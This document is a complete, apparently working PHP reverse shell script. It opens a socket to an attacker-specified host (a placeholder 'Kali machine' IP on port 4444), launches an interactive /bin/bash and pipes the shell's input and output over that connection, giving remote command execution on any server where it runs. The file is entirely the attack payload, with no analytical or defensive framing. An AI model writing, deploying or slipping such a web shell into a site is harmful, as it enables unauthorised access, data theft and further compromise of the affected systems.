<?php
// Change the IP and port to your Kali machine's IP and port
$ip = 'YOUR_KALI_IP';
$port = 4444;
set_time_limit(0);
$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "$errstr ($errno)";
    exit(1);
}
$proc = proc_open('/bin/bash -i', array(
    0 => array('pipe', 'r'),
    1 => array('pipe', 'w'),
    2 => array('pipe', 'w')
), $pipes);

if (!is_resource($proc)) {
    exit(1);
}

stream_set_blocking($pipes[0], false);
stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
stream_set_blocking($socket, false);

while (1) {
    if (feof($socket)) break;
    if (feof($pipes[1])) break;

    $read = array($socket, $pipes[1], $pipes[2]);
    $write = null;
    $except = null;
    $num_changed_streams = stream_select($read, $write, $except, null);

    if (in_array($socket, $read)) {
        $input = fread($socket, 1024);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read)) {
        $output = fread($pipes[1], 1024);
        fwrite($socket, $output);
    }
    if (in_array($pipes[2], $read)) {
        $error = fread($pipes[2], 1024);
        fwrite($socket, $error);
    }
}
fclose($socket);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($proc);
?>
